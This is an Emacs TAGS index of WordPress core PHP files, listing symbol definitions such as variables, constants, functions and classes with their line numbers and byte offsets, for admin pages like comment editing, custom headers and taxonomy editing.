
wordpress/index.php,52
define('WP_USE_THEMES', true);WP_USE_THEMES14,278

wordpress/wp-activate.php,483
define( 'WP_INSTALLING', true );WP_INSTALLING2,6
function do_activate_header() {do_activate_header19,376
function wpmu_activate_stylesheet() {wpmu_activate_stylesheet24,492
		$key = !empty($_GET['key']) ? $_GET['key'] : $_POST['key'];key56,1548
		$result = wpmu_activate_signup($key);result57,1610
			    $signup = $result->get_error_data();signup60,1785
			$url = get_blogaddress_by_id( (int) $blog_id);url79,3244
			$user = new WP_User( (int) $user_id);user80,3294

wordpress/wp-admin/about.php,37
$title = __( 'About' );title12,188

wordpress/wp-admin/admin-ajax.php,197
define( 'DOING_AJAX', true );DOING_AJAX16,216
define( 'WP_ADMIN', true );WP_ADMIN17,246
$core_actions_get = array(core_actions_get39,832
$core_actions_post = array(core_actions_post44,1011

wordpress/wp-admin/admin-footer.php,105
$upgrade = apply_filters( 'update_footer', '' );upgrade21,436
$footer_text = array(footer_text22,485

wordpress/wp-admin/admin-functions.php,0

wordpress/wp-admin/admin-header.php,1104
$title = esc_html( strip_tags( $title ) );title22,633
	$admin_title = __( 'Network Admin' );admin_title25,703
	$admin_title = __( 'Global Dashboard' );admin_title27,769
	$admin_title = get_bloginfo( 'name' );admin_title29,816
if ( $admin_title == $title )admin_title31,857
	$admin_title = sprintf( __( '%1$s &#8212; WordPress' ), $title );admin_title32,887
	$admin_title = sprintf( __( '%1$s &lsaquo; %2$s &#8212; WordPress' ), $title, $admin_title );admin_title34,959
$admin_title = apply_filters( 'admin_title', $admin_title, $title );admin_title36,1055
$admin_body_class = preg_replace('/[^a-z0-9_-]+/i', '-', $hook_suffix);admin_body_class49,1308
addLoadEvent = function(func){if(typeof jQuery!="undefined")jQuery(document).ready(func);else if(typeof wpOnload!='function'){wpOnload=func;}else{var oldonload=wpOnload;wpOnload=function(){oldonload();func();}}};addLoadEvent52,1415
		'uid': '<?php if ( ! isset($current_user) ) $current_user = wp_get_current_user(); echo $current_user->ID; ?>',current_user55,1691
if ( $parent_file == 'options-general.php' )parent_file139,4345

wordpress/wp-admin/admin-post.php,80
define('WP_ADMIN', true);WP_ADMIN10,178
$action = 'admin_post';action23,412

wordpress/wp-admin/admin.php,2072
	define('WP_ADMIN', true);WP_ADMIN15,203
	define('WP_NETWORK_ADMIN', false);WP_NETWORK_ADMIN18,268
	define('WP_USER_ADMIN', false);WP_USER_ADMIN21,339
	define('WP_BLOG_ADMIN', true);WP_BLOG_ADMIN24,420
	define('WP_LOAD_IMPORTERS', true);WP_LOAD_IMPORTERS28,518
		$c = get_blog_count();c53,1249
			$response = wp_remote_get( admin_url( 'upgrade.php?step=1' ), array( 'timeout' => 120, 'httpversion' => '1.1' ) );response56,1398
$date_format = get_option('date_format');date_format76,1892
$time_format = get_option('time_format');time_format77,1934
$editing = false;editing84,2146
	$plugin_page = stripslashes($_GET['page']);plugin_page87,2195
	$plugin_page = plugin_basename($plugin_page);plugin_page88,2240
	$typenow = $_REQUEST['post_type'];typenow92,2375
	$typenow = '';typenow94,2416
	$taxnow = $_REQUEST['taxonomy'];taxnow97,2515
	$taxnow = '';taxnow99,2554
		$the_parent = $pagenow . '?post_type=' . $typenow;the_parent115,2975
		$the_parent = $pagenow;the_parent117,3034
	if ( ! $page_hook = get_plugin_page_hook($plugin_page, $the_parent) ) {page_hook118,3060
		$page_hook = get_plugin_page_hook($plugin_page, $plugin_page);page_hook119,3133
				$query_string = $_SERVER[ 'QUERY_STRING' ];query_string124,3514
				$query_string = 'page=' . $plugin_page;query_string126,3570
$hook_suffix = '';hook_suffix134,3713
	$hook_suffix = $page_hook;hook_suffix136,3757
	$hook_suffix = $plugin_page;hook_suffix138,3817
	$hook_suffix = $pagenow;hook_suffix140,3875
	$importer = $_GET['import'];importer175,4903
	$parent_file = 'tools.php';parent_file190,5299
	$submenu_file = 'import.php';submenu_file191,5328
	$title = __('Import');title192,5359
	define('WP_IMPORTING', true);WP_IMPORTING199,5532
	if ( $typenow == 'page' ) {typenow216,6022
		if ( $pagenow == 'post-new.php' )pagenow217,6051
		elseif ( $pagenow == 'post.php' )pagenow219,6124
	}  elseif ( $pagenow == 'edit-tags.php' ) {pagenow221,6193
		if ( $taxnow == 'category' )taxnow222,6238
		elseif ( $taxnow == 'link_category' )taxnow224,6308

wordpress/wp-admin/async-upload.php,281
define('WP_ADMIN', true);WP_ADMIN9,147
	$post = get_post( $id );post33,1195
	$post_type_object = get_post_type_object( 'attachment' );post_type_object36,1302
$id = media_handle_upload('async-upload', $_REQUEST['post_id']);id52,1873
	$type = $_REQUEST['type'];type66,2492

wordpress/wp-admin/comment.php,3286
$parent_file = 'edit-comments.php';parent_file12,161
$submenu_file = 'edit-comments.php';submenu_file13,197
	$action = 'deletecomment';action18,310
	$action = 'delete';action21,363
	$action = 'approve';action23,412
		$action = 'spam';action27,495
		$action = 'trash';action29,550
function comment_footer_die( $msg ) {comment_footer_die37,712
	$title = __('Edit Comment');title46,878
	$comment_id = absint( $_GET['c'] );comment_id65,1790
	$comment = get_comment_to_edit( $comment_id );comment76,2316
	$title = __('Moderate Comment');title87,2481
	$comment_id = absint( $_GET['c'] );comment_id89,2516
	if ( $action == str_replace( '1', 'approve', $comment->comment_approved ) ) {action102,2873
	$formaction    = $action . 'comment';formaction109,3075
	$nonce_action  = 'approve' == $action ? 'approve-comment_' : 'delete-comment_';nonce_action110,3114
		$caution_msg = __('You are about to mark the following comment as spam:');caution_msg124,3382
		$button      = __('Spam Comment');button125,3459
		$caution_msg = __('You are about to move the following comment to the Trash:');caution_msg128,3521
		$button      = __('Trash Comment');button129,3603
		$caution_msg = __('You are about to delete the following comment:');caution_msg132,3667
		$button      = __('Permanently Delete Comment');button133,3738
		$caution_msg = __('You are about to approve the following comment:');caution_msg136,3809
		$button      = __('Approve Comment');button137,3881
	$message = '';message142,3997
			$message = __('This comment is currently approved.');message145,4067
			$message  = __('This comment is currently marked as spam.');message148,4150
			$message  = __('This comment is currently in the Trash.');message151,4241
	$comment_id = absint( $_REQUEST['c'] );comment_id212,6013
	$noredir = isset($_REQUEST['noredir']);noredir219,6254
		$redir = wp_get_referer();redir227,6725
		$redir = wp_get_original_referer();redir229,6812
		$redir = admin_url('edit-comments.php?p=' . absint( $comment->comment_post_ID ) );redir231,6929
		$redir = admin_url('edit-comments.php');redir233,7020
	$redir = remove_query_arg( array('spammed', 'unspammed', 'trashed', 'untrashed', 'deleted', 'ids', 'approved', 'unapproved'), $redir );redir235,7064
			$redir = add_query_arg( array('deleted' => '1'), $redir );redir240,7286
			$redir = add_query_arg( array('trashed' => '1', 'ids' => $comment_id), $redir );redir244,7416
			$redir = add_query_arg( array('untrashed' => '1'), $redir );redir248,7572
			$redir = add_query_arg( array('spammed' => '1', 'ids' => $comment_id), $redir );redir252,7702
			$redir = add_query_arg( array('unspammed' => '1'), $redir );redir256,7856
			$redir = add_query_arg( array( 'approved' => 1 ), $redir );redir260,8008
			$redir = add_query_arg( array( 'unapproved' => 1 ), $redir );redir264,8158
	$comment_id = absint( $_POST['comment_ID'] );comment_id274,8300
	$comment_post_id = absint( $_POST['comment_post_ID'] );comment_post_id275,8347
	$location = ( empty( $_POST['referredby'] ) ? "edit-comments.php?p=$comment_post_id" : $_POST['referredby'] ) . '#comment-' . $comment_id;location281,8481
	$location = apply_filters( 'comment_edit_redirect', $location, $comment_id );location282,8621

wordpress/wp-admin/credits.php,1631
$title = __( 'Credits' );title12,177
function wp_credits() {wp_credits14,204
	$locale = get_locale();locale16,249
	$results = get_site_transient( 'wordpress_credits_' . $locale );results18,275
		$response = wp_remote_get( "http://api.wordpress.org/core/credits/1.0/?version=$wp_version&locale=$locale" );response23,482
		$results = maybe_unserialize( wp_remote_retrieve_body( $response ) );results28,703
function _wp_credits_add_profile_link( &$display_name, $username, $profiles ) {_wp_credits_add_profile_link39,935
	$display_name = '<a href="' . esc_url( sprintf( $profiles, $username ) ) . '">' . esc_html( $display_name ) . '</a>';display_name40,1015
function _wp_credits_build_object_link( &$data ) {_wp_credits_build_object_link43,1137
	$data = '<a href="' . esc_url( $data[1] ) . '">' . $data[0] . '</a>';data44,1188
$credits = wp_credits();credits71,2073
$gravatar = is_ssl() ? 'https://secure.gravatar.com/avatar/' : 'http://0.gravatar.com/avatar/';gravatar84,2713
foreach ( $credits['groups'] as $group_slug => $group_data ) {group_slug86,2810
			$title = _x( 'Translators', 'Translate this to be the equivalent of English Translators in your language for the credits page Translators section' );title90,3046
			$title = vsprintf( translate( $group_data['name'] ), $group_data['placeholders'] );title92,3253
			$title = translate( $group_data['name'] );title94,3351
			$compact = 'compact' == $group_data['type'];compact113,4106
			$classes = 'wp-people-group ' . ( $compact ? 'compact' : '' );classes114,4154
				$size = 'compact' == $group_data['type'] ? '30' : '60';size119,4533

wordpress/wp-admin/custom-background.php,3636
class Custom_Background {Custom_Background16,214
	var $admin_header_callback;admin_header_callback25,350
	var $admin_image_div_callback;admin_image_div_callback34,478
	var $page = '';page43,608
	var $page = '';page43,608
	function __construct($admin_header_callback = '', $admin_image_div_callback = '') {__construct53,878
	function __construct($admin_header_callback = '', $admin_image_div_callback = '') {admin_image_div_callback53,878
		$this->admin_header_callback = $admin_header_callback;admin_header_callback54,963
		$this->admin_image_div_callback = $admin_image_div_callback;admin_image_div_callback55,1020
	function init() {init66,1323
		$this->page = $page = add_theme_page(__('Background'), __('Background'), 'edit_theme_options', 'custom-background', array(&$this, 'admin_page'));page70,1404
	function admin_load() {admin_load91,2274
	function take_action() {take_action119,3913
			$this->updated = true;updated128,4195
			$this->updated = true;updated137,4512
				$repeat = $_POST['background-repeat'];repeat145,4798
				$repeat = 'repeat';repeat147,4849
				$position = $_POST['background-position-x'];position154,5107
				$position = 'left';position156,5164
				$attachment = $_POST['background-attachment'];attachment163,5420
				$attachment = 'fixed';attachment165,5479
			$color = preg_replace('/[^0-9a-fA-F]/', '', $_POST['background-color']);color171,5657
		$this->updated = true;updated178,5889
	function admin_page() {admin_page186,5989
$background_styles = '';background_styles208,6601
if ( $bgcolor = get_background_color() )bgcolor209,6626
<?php $default_image = get_theme_support( 'custom-background', 'default-image' ); ?>default_image241,8180
		$image_library_url = get_upload_iframe_src( 'image', null, 'library' );image_library_url266,9323
		$image_library_url = remove_query_arg( 'TB_iframe', $image_library_url );image_library_url267,9397
		$image_library_url = add_query_arg( array( 'context' => 'custom-background', 'TB_iframe' => 1 ), $image_library_url );image_library_url268,9473
<?php $show_clear = get_theme_mod('background_color') ? '' : ' style="display:none"'; ?>show_clear330,12509
	function handle_upload() {handle_upload353,13615
		$overrides = array('test_form' => false);overrides359,13768
		$file = wp_handle_upload($_FILES['import'], $overrides);file360,13812
		$url = $file['url'];url365,13933
		$type = $file['type'];type366,13956
		$file = $file['file'];file367,13981
		$filename = basename($file);filename368,14006
		$object = array(object371,14070
		$id = wp_insert_attachment($object, $file);id380,14256
		$thumbnail = wp_get_attachment_image_src( $id, 'thumbnail' );thumbnail388,14564
		$this->updated = true;updated392,14776
	function attachment_fields_to_edit( $form_fields, $post ) {attachment_fields_to_edit400,14906
		$form_fields = array( 'image-size' => $form_fields['image-size'] );form_fields401,14967
	function filter_upload_tabs() {filter_upload_tabs413,15441
	public function wp_set_background_image() {wp_set_background_image417,15530
		$attachment_id = absint($_POST['attachment_id']);attachment_id419,15669
		$sizes = array_keys(apply_filters( 'image_size_names_choose', array('thumbnail' => __('Thumbnail'), 'medium' => __('Medium'), 'large' => __('Large'), 'full' => __('Full Size')) ));sizes420,15721
		$size = 'thumbnail';size421,15904
			$size = esc_attr( $_POST['size'] );size423,15971
		$url = wp_get_attachment_image_src( $attachment_id, $size );url426,16115
		$thumbnail = wp_get_attachment_image_src( $attachment_id, 'thumbnail' );thumbnail427,16178

wordpress/wp-admin/custom-header.php,8854
class Custom_Image_Header {Custom_Image_Header16,218
	var $admin_header_callback;admin_header_callback25,356
	var $admin_image_div_callback;admin_image_div_callback34,484
	var $default_headers = array();default_headers43,610
	var $default_headers = array();default_headers43,610
	var $uploaded_headers = array();uploaded_headers52,756
	var $uploaded_headers = array();uploaded_headers52,756
	var $page = '';page61,888
	var $page = '';page61,888
	function __construct($admin_header_callback, $admin_image_div_callback = '') {__construct71,1160
	function __construct($admin_header_callback, $admin_image_div_callback = '') {admin_image_div_callback71,1160
		$this->admin_header_callback = $admin_header_callback;admin_header_callback72,1240
		$this->admin_image_div_callback = $admin_image_div_callback;admin_image_div_callback73,1297
	function init() {init83,1505
		$this->page = $page = add_theme_page(__('Header'), __('Header'), 'edit_theme_options', 'custom-header', array(&$this, 'admin_page'));page87,1586
	function help() {help109,2558
	function step() {step151,5574
		$step = (int) $_GET['step'];step155,5641
	function js_includes() {js_includes170,6027
		$step = $this->step();step171,6053
	function css_includes() {css_includes189,6468
		$step = $this->step();step190,6495
	function take_action() {take_action203,6791
		$this->updated = true;updated210,6916
			$color = preg_replace('/[^0-9a-fA-F]/', '', $_POST['text-color']);color236,7899
	function process_default_headers() {process_default_headers255,8415
		$this->default_headers = $_wp_default_headers;default_headers264,8579
		$template_directory_uri = get_template_directory_uri();template_directory_uri265,8628
		$stylesheet_directory_uri = get_stylesheet_directory_uri();stylesheet_directory_uri266,8686
	function show_header_selector( $type = 'default' ) {show_header_selector282,9374
	function show_header_selector( $type = 'default' ) {type282,9374
			$headers = $this->default_headers;headers284,9458
			$headers = get_uploaded_header_images();headers286,9507
			$type = 'uploaded';type287,9551
		foreach ( $headers as $header_key => $header ) {header_key299,9976
			$header_thumbnail = $header['thumbnail_url'];header_thumbnail300,10027
			$header_url = $header['url'];header_url301,10076
			$header_desc = empty( $header['description'] ) ? '' : $header['description'];header_desc302,10109
			$width = '';width305,10404
				$width = ' width="230"';width307,10465
	function js() {js319,10805
		$step = $this->step();step320,10822
	function js_1() { ?>js_1332,11086
	function pickColor(color) {pickColor340,11308
	function toggle_text() {toggle_text347,11470
	function js_2() { ?>js_2414,13041
	function onEndCrop( coords ) {onEndCrop417,13111
			onInit: function () {onInit466,14469
			onSelectChange: function(img, c) {onSelectChange470,14567
	function step_1() {step_1488,14864
			$style = ' style="color:#' . get_header_textcolor() . ';"';style517,15723
			$style = ' style="display:none;"';style519,15793
		$image_library_url = get_upload_iframe_src( 'image', null, 'library' );image_library_url558,18384
		$image_library_url = remove_query_arg( 'TB_iframe', $image_library_url );image_library_url559,18458
		$image_library_url = add_query_arg( array( 'context' => 'custom-header', 'TB_iframe' => 1 ), $image_library_url );image_library_url560,18534
	$default_image = get_theme_support( 'custom-header', 'default-image' );default_image612,20289
	function step_2() {step_2684,22660
			$attachment_id = absint( $_GET['file'] );attachment_id690,22920
			$file = get_attached_file( $attachment_id, true );file691,22965
			$url = wp_get_attachment_image_src( $attachment_id, 'full');url692,23019
			$url = $url[0];url693,23083
			$data = wp_get_attachment_metadata( $attachment_id );data701,23292
			$height = $data[ 'height' ];height702,23349
			$width = $data[ 'width' ];width703,23381
		$max_width = 0;max_width707,23435
			$max_width = 1500;max_width710,23601
			$max_width = max( $max_width, get_theme_support( 'custom-header', 'max-width' ) );max_width713,23688
		$max_width = max( $max_width, get_theme_support( 'custom-header', 'width' ) );max_width714,23774
			&& $width == get_theme_support( 'custom-header', 'width' ) && $height == get_theme_support( 'custom-header', 'height' ) )width718,24061
			$oitar = $width / $max_width;oitar729,24593
			$image = wp_crop_image($attachment_id, 0, 0, $width, $height, $max_width, $height / $oitar, false, str_replace(basename($file), 'midsize-'.basename($file), $file));image730,24626
			$image = apply_filters('wp_create_file_in_uploads', $image, $attachment_id); // For replicationimage734,24954
			$url = str_replace(basename($url), basename($image), $url);url736,25054
			$width = $width / $oitar;width737,25117
			$height = $height / $oitar;height738,25146
			$oitar = 1;oitar740,25188
	function step_2_manage_upload() {step_2_manage_upload785,26841
		$overrides = array('test_form' => false);overrides786,26876
		$file = wp_handle_upload($_FILES['import'], $overrides);file787,26920
		$url = $file['url'];url792,27070
		$type = $file['type'];type793,27093
		$file = $file['file'];file794,27118
		$filename = basename($file);filename795,27143
		$object = array(object798,27207
		$attachment_id = wp_insert_attachment( $object, $file );attachment_id807,27412
	function step_3() {step_3816,27630
		$attachment_id = absint( $_POST['attachment_id'] );attachment_id829,28061
		$original = get_attached_file($attachment_id);original830,28115
		$max_width = 0;max_width833,28166
			$max_width = 1500;max_width836,28332
			$max_width = max( $max_width, get_theme_support( 'custom-header', 'max-width' ) );max_width839,28419
		$max_width = max( $max_width, get_theme_support( 'custom-header', 'width' ) );max_width840,28505
			$dst_height = absint( $_POST['height'] * ( $max_width / $_POST['width'] ) );dst_height843,28750
			$dst_height = absint( $_POST['height'] );dst_height845,28959
			$dst_height = get_theme_support( 'custom-header', 'height' );dst_height847,29011
			$dst_width = absint( $_POST['width'] * ( $max_width / $_POST['width'] ) );dst_width850,29240
			$dst_width = absint( $_POST['width'] );dst_width852,29447
			$dst_width = get_theme_support( 'custom-header', 'width' );dst_width854,29497
			$cropped = wp_crop_image( $attachment_id, (int) $_POST['x1'], (int) $_POST['y1'], (int) $_POST['width'], (int) $_POST['height'], $dst_width, $dst_height );cropped857,29603
			$cropped = _copy_image_file( $attachment_id );cropped859,29818
			$cropped = get_attached_file( $attachment_id );cropped861,29875
		$cropped = apply_filters('wp_create_file_in_uploads', $cropped, $attachment_id); // For replicationcropped866,30089
		$parent = get_post($attachment_id);parent868,30192
		$parent_url = $parent->guid;parent_url869,30230
		$url = str_replace( basename( $parent_url ), basename( $cropped ), $parent_url );url870,30261
		$size = @getimagesize( $cropped );size872,30346
		$image_type = ( $size ) ? $size['mime'] : 'image/jpeg';image_type873,30383
		$object = array(object876,30474
		$attachment_id = wp_insert_attachment( $object, $cropped );attachment_id888,30785
		$width = $dst_width;width891,30960
		$height = $dst_height;height892,30983
		$medium = str_replace( basename( $original ), 'midsize-' . basename( $original ), $original );medium896,31105
	function finished() {finished910,31553
		$this->updated = true;updated911,31576
	function admin_page() {admin_page920,31703
		$step = $this->step();step923,31845
	function attachment_fields_to_edit( $form_fields, $post ) {attachment_fields_to_edit937,32082
		$form_fields = array();form_fields938,32143
		$href = esc_url(add_query_arg(array(href939,32169
	function filter_upload_tabs() {filter_upload_tabs957,32772
	final public function set_header_image( $choice ) {set_header_image973,33509
			$choice = (array) $choice;choice975,33617
			$header_image_data = (object) array(header_image_data981,33787
		$uploaded = get_uploaded_header_images();uploaded1001,34486
			$header_image_data = $uploaded[ $choice ];header_image_data1003,34584
				$header_image_data = $this->default_headers[ $choice ];header_image_data1008,34732
	final public function remove_header_image() {remove_header_image1022,35016
	final public function reset_header_image() {reset_header_image1033,35304
		$default = get_theme_support( 'custom-header', 'default-image' );default1035,35386
		$default = sprintf( $default, get_template_directory_uri(), get_stylesheet_directory_uri() );default1040,35516
		foreach ( $this->default_headers as $header => $details ) {header1042,35613
				$default_data = $details;default_data1044,35715

wordpress/wp-admin/customize.php,1713
define( 'IFRAME_REQUEST', true );IFRAME_REQUEST10,103
$url = urldecode( $url );url17,302
$url = wp_validate_redirect( $url, home_url( '/' ) );url18,328
	$return = wp_validate_redirect( urldecode( $return ) );return20,397
	$return = $url;return22,471
$registered = $wp_scripts->registered;registered26,525
$wp_scripts = new WP_Scripts;wp_scripts27,564
$body_class = '';body_class47,1221
$is_ios = wp_is_mobile() && preg_match( '/iPad|iPod|iPhone/', $_SERVER['HTTP_USER_AGENT'] );is_ios55,1436
$admin_title = sprintf( __( '%1$s &#8212; WordPress' ), strip_tags( sprintf( __( 'Customize %s' ), $wp_customize->theme()->display('Name') ) ) );admin_title60,1570
				$save_text = $wp_customize->is_theme_active() ? __( 'Save &amp; Publish' ) : __( 'Save &amp; Activate' );save_text72,2115
			$screenshot = $wp_customize->theme()->get_screenshot();screenshot82,2533
			$cannot_expand = ! ( $screenshot || $wp_customize->theme()->get('Description') );cannot_expand83,2592
	$allowed_urls = array( home_url('/') );allowed_urls134,4685
	$admin_origin = parse_url( admin_url() );admin_origin135,4726
	$home_origin  = parse_url( home_url() );home_origin136,4769
	$cross_domain = ( strtolower( $admin_origin[ 'host' ] ) != strtolower( $home_origin[ 'host' ] ) );cross_domain137,4811
	$allowed_urls = array_unique( apply_filters( 'customize_allowed_urls', $allowed_urls ) );allowed_urls142,4995
	$fallback_url = add_query_arg( array(fallback_url144,5087
	$login_url = add_query_arg( array(login_url152,5340
	$settings = array(settings157,5448
	foreach ( $wp_customize->settings() as $id => $setting ) {id185,6455
	foreach ( $wp_customize->controls() as $id => $control ) {id192,6643

wordpress/wp-admin/edit-comments.php,3296
$wp_list_table = _get_list_table('WP_Comments_List_Table');wp_list_table14,256
$pagenum = $wp_list_table->get_pagenum();pagenum15,316
$doaction = $wp_list_table->current_action();doaction17,359
		$comment_status = $wpdb->escape( $_REQUEST['comment_status'] );comment_status23,547
		$delete_time = $wpdb->escape( $_REQUEST['pagegen_timestamp'] );delete_time24,613
		$comment_ids = $wpdb->get_col( "SELECT comment_ID FROM $wpdb->comments WHERE comment_approved = '$comment_status' AND '$delete_time' > comment_date_gmt" );comment_ids25,679
		$doaction = 'delete';doaction26,837
		$comment_ids = $_REQUEST['delete_comments'];comment_ids28,915
		$doaction = ( $_REQUEST['action'] != -1 ) ? $_REQUEST['action'] : $_REQUEST['action2'];doaction29,962
		$comment_ids = array_map( 'absint', explode( ',', $_REQUEST['ids'] ) );comment_ids31,1094
	$approved = $unapproved = $spammed = $unspammed = $trashed = $untrashed = $deleted = 0;approved37,1253
	$redirect_to = remove_query_arg( array( 'trashed', 'untrashed', 'deleted', 'spammed', 'unspammed', 'approved', 'unapproved', 'ids' ), wp_get_referer() );redirect_to39,1343
	$redirect_to = add_query_arg( 'paged', $pagenum, $redirect_to );redirect_to40,1498
		$redirect_to = add_query_arg( 'approved', $approved, $redirect_to );redirect_to79,2387
		$redirect_to = add_query_arg( 'unapproved', $unapproved, $redirect_to );redirect_to81,2478
		$redirect_to = add_query_arg( 'spammed', $spammed, $redirect_to );redirect_to83,2570
		$redirect_to = add_query_arg( 'unspammed', $unspammed, $redirect_to );redirect_to85,2658
		$redirect_to = add_query_arg( 'trashed', $trashed, $redirect_to );redirect_to87,2748
		$redirect_to = add_query_arg( 'untrashed', $untrashed, $redirect_to );redirect_to89,2836
		$redirect_to = add_query_arg( 'deleted', $deleted, $redirect_to );redirect_to91,2926
		$redirect_to = add_query_arg( 'ids', join( ',', $comment_ids ), $redirect_to );redirect_to93,3024
	$title = sprintf(__('Comments on &#8220;%s&#8221;'), wp_html_excerpt(_draft_or_post_title($post_id), 50));title108,3449
	$title = __('Comments');title110,3562
	$error = (int) $_REQUEST['error'];error161,6893
	$error_msg = '';error_msg162,6929
			$error_msg = __( 'Oops, no comment with this ID.' );error_msg165,6979
			$error_msg = __( 'You are not allowed to edit comments on this post.' );error_msg168,7056
	$approved  = isset( $_REQUEST['approved']  ) ? (int) $_REQUEST['approved']  : 0;approved176,7468
	$deleted   = isset( $_REQUEST['deleted']   ) ? (int) $_REQUEST['deleted']   : 0;deleted177,7550
	$trashed   = isset( $_REQUEST['trashed']   ) ? (int) $_REQUEST['trashed']   : 0;trashed178,7632
	$untrashed = isset( $_REQUEST['untrashed'] ) ? (int) $_REQUEST['untrashed'] : 0;untrashed179,7714
	$spammed   = isset( $_REQUEST['spammed']   ) ? (int) $_REQUEST['spammed']   : 0;spammed180,7796
	$unspammed = isset( $_REQUEST['unspammed'] ) ? (int) $_REQUEST['unspammed'] : 0;unspammed181,7878
	$same      = isset( $_REQUEST['same'] )      ? (int) $_REQUEST['same']      : 0;same182,7960
			$ids = isset($_REQUEST['ids']) ? $_REQUEST['ids'] : 0;ids189,8315
			$ids = isset($_REQUEST['ids']) ? $_REQUEST['ids'] : 0;ids197,8828
		if ( $same > 0 && $comment = get_comment( $same ) ) {comment207,9474

wordpress/wp-admin/edit-form-advanced.php,3921
$post_ID = isset($post_ID) ? (int) $post_ID : 0;post_ID28,503
$user_ID = isset($user_ID) ? (int) $user_ID : 0;user_ID29,552
$action = isset($action) ? $action : '';action30,601
$messages = array();messages32,643
$messages = apply_filters( 'post_updated_messages', $messages );messages63,2994
$message = false;message65,3060
		$message = $messages[$post_type][$_GET['message']];message69,3214
		$message = $messages['post'][$_GET['message']];message71,3356
$notice = false;notice74,3409
$form_extra = '';form_extra75,3426
	$autosave = false;autosave79,3540
	$autosave = wp_get_post_autosave( $post_ID );autosave82,3656
$form_action = 'editpost';form_action85,3706
$nonce_action = 'update-' . $post_type . '_' . $post_ID;nonce_action86,3733
	foreach ( _wp_post_revision_fields() as $autosave_field => $_autosave_field ) {autosave_field91,4132
			$notice = sprintf( __( 'There is an autosave of this post that is more recent than the version below. <a href="%s">View the autosave</a>' ), get_edit_post_link( $autosave->ID ) );notice93,4325
$post_type_object = get_post_type_object($post_type);post_type_object100,4571
	$taxonomy = get_taxonomy($tax_name);taxonomy112,5180
	$label = $taxonomy->labels->name;label116,5260
	$customize_display = '<p>' . __('The title field and the big Post Editing Area are fixed in place, but you can reposition all the other boxes using drag and drop, and can minimize or expand them by clicking the title bar of each box. Use the Screen Options tab to unhide more boxes (Excerpt, Send Trackbacks, Custom Fields, Discussion, Slug, Author) or to choose a 1- or 2-column layout for this screen.') . '</p>';customize_display167,7894
	$title_and_editor  = '<p>' . __('<strong>Title</strong> - Enter a title for your post. After you enter a title, you&#8217;ll see the permalink below, which you can edit.') . '</p>';title_and_editor175,8481
	$publish_box = '<p>' . __('<strong>Publish</strong> - You can set the terms of publishing your post in the Publish box. For Status, Visibility, and Publish (immediately), click on the Edit link to reveal more options. Visibility includes options for password-protecting a post or making it stay at the top of your blog indefinitely (sticky). Publish (immediately) allows you to set a future or past date and time, so you can schedule a post to be published in the future or backdate a post.') . '</p>';publish_box184,9612
	$discussion_settings  = '<p>' . __('<strong>Send Trackbacks</strong> - Trackbacks are a way to notify legacy blog systems that you&#8217;ve linked to them. Enter the URL(s) you want to send trackbacks. If you link to other WordPress sites they&#8217;ll be notified automatically using pingbacks, and this field is unnecessary.') . '</p>';discussion_settings200,11251
	$about_pages = '<p>' . __('Pages are similar to Posts in that they have a title, body text, and associated metadata, but they are different in that they are not part of the chronological blog stream, kind of like permanent posts. Pages are not categorized or tagged, but can have a hierarchy. You can nest Pages under other Pages by making one the &#8220;Parent&#8221; of the other, creating a group of Pages.') . '</p>' .about_pages216,12496
	$page_attributes = '<p>' . __('<strong>Parent</strong> - You can arrange your pages in hierarchies. For example, you could have an &#8220;About&#8221; page that has &#8220;Life Story&#8221; and &#8220;My Dog&#8221; pages under it. There are no limits to how many levels you can nest pages.') . '</p>' .page_attributes225,13541
$sample_permalink_html = $post_type_object->public ? get_sample_permalink_html($post->ID) : '';sample_permalink_html290,17484
$shortlink = wp_get_shortlink($post->ID, 'post');shortlink291,17580
		if ( $last_id = get_post_meta($post_ID, '_edit_last', true) ) {last_id324,18851
			$last_user = get_userdata($last_id);last_user325,18917

wordpress/wp-admin/edit-form-comment.php,457
			$link = '<a href="' . $comment->comment_author_url . '" rel="external nofollow" target="_blank">' . __('visit site') . '</a>';link51,1757
	$quicktags_settings = array( 'buttons' => 'strong,em,link,block,del,ins,img,ul,ol,li,code,spell,close' );quicktags_settings66,2283
$datef = __( 'M j, Y @ G:i' );datef97,3996
$stamp = __('Submitted on: <b>%1$s</b>');stamp98,4027
$date = date_i18n( $datef, strtotime( $comment->comment_date ) );date99,4069

wordpress/wp-admin/edit-link-form.php,701
	$heading = sprintf( __( '<a href="%s">Links</a> / Edit Link' ), 'link-manager.php' );heading14,219
	$submit_text = __('Update Link');submit_text15,306
	$form = '<form name="editlink" id="editlink" method="post" action="link.php">';form16,341
	$nonce_action = 'update-bookmark_' . $link_id;nonce_action17,422
	$heading = sprintf( __( '<a href="%s">Links</a> / Add New Link' ), 'link-manager.php' );heading19,479
	$submit_text = __('Add Link');submit_text20,569
	$form = '<form name="addlink" id="addlink" method="post" action="link.php">';form21,601
	$nonce_action = 'add-bookmark';nonce_action22,680
$side_meta_boxes = do_meta_boxes( 'link', 'side', $link );side_meta_boxes111,4949

wordpress/wp-admin/edit-tag-form.php,0

wordpress/wp-admin/edit-tags.php,4015
$tax = get_taxonomy( $taxnow );tax15,233
$wp_list_table = _get_list_table('WP_Terms_List_Table');wp_list_table23,411
$pagenum = $wp_list_table->get_pagenum();pagenum24,468
$title = $tax->labels->name;title26,511
	$parent_file = "edit.php?post_type=$post_type";parent_file29,571
	$submenu_file = "edit-tags.php?taxonomy=$taxonomy&amp;post_type=$post_type";submenu_file30,620
	$parent_file = 'link-manager.php';parent_file32,744
	$submenu_file = 'edit-tags.php?taxonomy=link_category';submenu_file33,780
	$parent_file = 'edit.php';parent_file35,846
	$submenu_file = "edit-tags.php?taxonomy=$taxonomy";submenu_file36,874
	$ret = wp_insert_term( $_POST['tag-name'], $taxonomy, $_POST );ret50,1267
	$location = 'edit-tags.php?taxonomy=' . $taxonomy;location51,1332
	if ( $referer = wp_get_original_referer() ) {referer55,1457
			$location = $referer;location57,1559
		$location = add_query_arg( 'message', 1, $location );location61,1625
		$location = add_query_arg( 'message', 4, $location );location63,1687
	$location = 'edit-tags.php?taxonomy=' . $taxonomy;location69,1800
	if ( $referer = wp_get_referer() ) {referer72,1924
			$location = $referer;location74,2017
	$tag_ID = (int) $_REQUEST['tag_ID'];tag_ID82,2126
	$location = add_query_arg( 'message', 2, $location );location90,2348
	$tags = (array) $_REQUEST['delete_tags'];tags102,2598
	$location = 'edit-tags.php?taxonomy=' . $taxonomy;location107,2717
	if ( $referer = wp_get_referer() ) {referer110,2841
			$location = $referer;location112,2934
	$location = add_query_arg( 'message', 6, $location );location115,2963
	$title = $tax->labels->edit_item;title122,3074
